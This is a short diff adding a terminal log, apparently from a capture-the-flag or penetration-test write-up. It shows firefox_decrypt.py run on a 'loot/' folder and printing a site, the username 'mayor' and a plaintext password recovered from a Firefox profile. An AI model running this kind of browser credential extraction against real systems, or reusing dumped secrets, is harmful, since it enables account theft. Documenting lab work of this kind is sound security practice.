@@ -1,0 +1,7 @@
+# python3 /opt/firefox_decrypt/firefox_decrypt.py loot/
+2021-06-02 08:56:47,622 - WARNING - profile.ini not found in loot/
+2021-06-02 08:56:47,623 - WARNING - Continuing and assuming 'loot/' is a profile location
+
+Website:   https://creds.com
+Username: 'mayor'
+Password: '8CL7O1N78MdrCIsV'
